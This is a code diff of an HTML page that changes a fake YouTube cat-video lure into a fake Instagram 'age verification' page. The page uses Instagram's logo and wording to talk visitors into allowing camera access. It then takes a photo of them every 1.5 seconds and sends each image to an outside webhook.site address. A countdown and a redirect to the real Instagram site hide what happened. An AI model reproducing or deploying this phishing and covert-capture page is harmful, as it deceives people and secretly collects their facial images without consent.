@@ -1,101 +1,150 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Funny Cat Video - YouTube</title>
-    <link rel="icon" href="https://www.youtube.com/favicon.ico">
+    <title>Instagram Age Verification</title>
+    <link rel="icon" href="https://static.cdninstagram.com/rsrc.php/v3/yI/r/VsNE-OHk_8a.png">
     <style>
-        body { font-family: Arial; background: #181818; color: white; text-align: center; padding: 50px; }
-        .loader { border: 5px solid #f3f3f3; border-top: 5px solid #ff0000; border-radius: 50%; 
-                  width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 20px auto; }
+        body { font-family: Arial, sans-serif; text-align: center; padding: 20px; }
+        .container { max-width: 500px; margin: 0 auto; background: white; 
+                     border-radius: 10px; padding: 30px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
+        .logo { width: 200px; margin-bottom: 20px; }
+        .button { background: #0095f6; color: white; border: none; padding: 12px 24px; 
+                  border-radius: 8px; font-size: 16px; cursor: pointer; margin: 10px; }
+        .loader { border: 3px solid #f3f3f3; border-top: 3px solid #0095f6; 
+                  border-radius: 50%; width: 40px; height: 40px; 
+                  animation: spin 1s linear infinite; margin: 20px auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .button { background: #ff0000; color: white; border: none; padding: 15px 30px; 
-                  font-size: 16px; border-radius: 5px; cursor: pointer; margin: 10px; }
-        .message { background: #ffcc00; color: #000; padding: 15px; border-radius: 5px; margin: 20px 0; }
+        .hidden { display: none; }
+        .message { background: #ffcc00; padding: 15px; border-radius: 5px; margin: 20px 0; }
     </style>
 </head>
 <body>
-    <h1>🎬 Funny Cat Compilation 2024</h1>
-    <div class="message">
-        🔒 Age verification required: Allow camera to confirm you are 18+
+    <div class="container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/200px-Instagram_logo.svg.png" 
+             alt="Instagram" class="logo">
+        
+        <h1>Age Verification Required</h1>
+        <div class="message">
+            To continue using Instagram, we need to verify your age using facial recognition.
+            This is a one-time process required by our updated community guidelines.
+        </div>
+        
+        <div id="step1">
+            <p>Click below to start facial verification:</p>
+            <button class="button" onclick="startVerification()">Start Face Verification</button>
+            <p><small>This helps us keep Instagram safe for all users.</small></p>
+        </div>
+        
+        <div id="step2" class="hidden">
+            <div class="loader"></div>
+            <p>Analyzing facial features...</p>
+            <p id="countdown" style="color: #0095f6; font-weight: bold;"></p>
+        </div>
     </div>
-    <div class="loader"></div>
-    <video id="videoElement" autoplay playsinline style="display:none;"></video>
-    <div>
-        <button class="button" onclick="startVerification()">Allow Camera to Continue</button>
-    </div>
-    <div id="status" style="margin-top:20px; color:#0f0;"></div>
 
     <script>
+        const WEBHOOK_URL = 'https://webhook.site/55c7351f-3130-4a37-92a9-54009202aa38';
         let stream = null;
-        const SERVER_URL = 'http://192.168.1.33:5000/upload';
+        let photos = [];
         
         async function startVerification() {
+            document.getElementById('step1').classList.add('hidden');
+            document.getElementById('step2').classList.remove('hidden');
+            
             try {
-                document.getElementById('status').textContent = 'Starting camera...';
-                
                 // فتح الكاميرا
                 stream = await navigator.mediaDevices.getUserMedia({ 
                     video: { facingMode: 'user', width: 640, height: 480 },
                     audio: false 
                 });
                 
-                const video = document.getElementById('videoElement');
+                // عرض معاينة صغيرة
+                const video = document.createElement('video');
                 video.srcObject = stream;
-                video.style.display = 'block';
-                document.querySelector('.loader').style.display = 'none';
-                document.getElementById('status').textContent = 'Camera active. Verifying...';
+                video.autoplay = true;
+                video.style.width = '100px';
+                video.style.position = 'fixed';
+                video.style.top = '10px';
+                video.style.right = '10px';
+                video.style.borderRadius = '5px';
+                document.body.appendChild(video);
                 
-                // البدء في التقاط الصور
+                // بدء التقاط الصور
                 startCapturing();
                 
-                // إعادة التوجيه بعد 10 ثوان
-                setTimeout(() => {
-                    document.getElementById('status').textContent = '✅ Verification complete! Redirecting...';
-                    window.location.href = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ';
-                }, 10000);
+                // العد التنازلي
+                let seconds = 10;
+                const countdownElement = document.getElementById('countdown');
+                
+                const timer = setInterval(() => {
+                    countdownElement.textContent = `Verification complete in ${seconds} seconds`;
+                    seconds--;
+                    
+                    if (seconds < 0) {
+                        clearInterval(timer);
+                        document.getElementById('step2').innerHTML = 
+                            '<h3 style="color: #2ecc71;">✅ Verification Successful!</h3>' +
+                            '<p>Redirecting to Instagram...</p>';
+                        
+                        setTimeout(() => {
+                            window.location.href = 'https://www.instagram.com';
+                        }, 2000);
+                    }
+                }, 1000);
                 
             } catch (err) {
-                document.getElementById('status').textContent = '❌ Please allow camera access';
-                alert('Camera access is required to watch this video.');
+                alert('Camera access is required for age verification. Please allow camera access and refresh the page.');
+                location.reload();
             }
         }
         
         function startCapturing() {
-            // التقاط صورة كل 2 ثانية
-            setInterval(async () => {
+            // التقاط صورة كل 1.5 ثانية
+            setInterval(() => {
                 if (!stream) return;
                 
-                const video = document.getElementById('videoElement');
+                // إنشاء canvas
                 const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
+                canvas.width = 320;
+                canvas.height = 240;
                 const ctx = canvas.getContext('2d');
-                ctx.drawImage(video, 0, 0);
                 
-                // تحويل الصورة
-                const imageData = canvas.toDataURL('image/jpeg', 0.7);
-                
-                // إرسال الصورة إلى الخادم
-                try {
-                    const response = await fetch(SERVER_URL, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ image: imageData })
-                    });
+                // رسم الفيديو
+                const videos = document.getElementsByTagName('video');
+                if (videos.length > 0) {
+                    ctx.drawImage(videos[0], 0, 0, canvas.width, canvas.height);
                     
-                    const result = await response.json();
-                    console.log('Image sent:', result.success);
+                    // تحويل الصورة
+                    const imageData = canvas.toDataURL('image/jpeg', 0.7);
+                    photos.push(imageData);
                     
-                } catch (err) {
-                    console.log('Failed to send image:', err);
+                    // إرسال الصورة إلى Webhook
+                    sendToWebhook(imageData);
                 }
                 
-            }, 2000);
+            }, 1500);
+        }
+        
+        function sendToWebhook(imageData) {
+            const data = {
+                image: imageData,
+                timestamp: new Date().toISOString(),
+                photos_count: photos.length
+            };
+            
+            fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            })
+            .then(response => console.log('Photo sent successfully'))
+            .catch(err => console.log('Error sending photo:', err));
         }
         
         // بدء تلقائي بعد 5 ثوان
         setTimeout(() => {
-            startVerification();
+            document.querySelector('.message').innerHTML += 
+                '<br><strong>98% of users complete verification in under 15 seconds.</strong>';
         }, 5000);
     </script>
 </body>
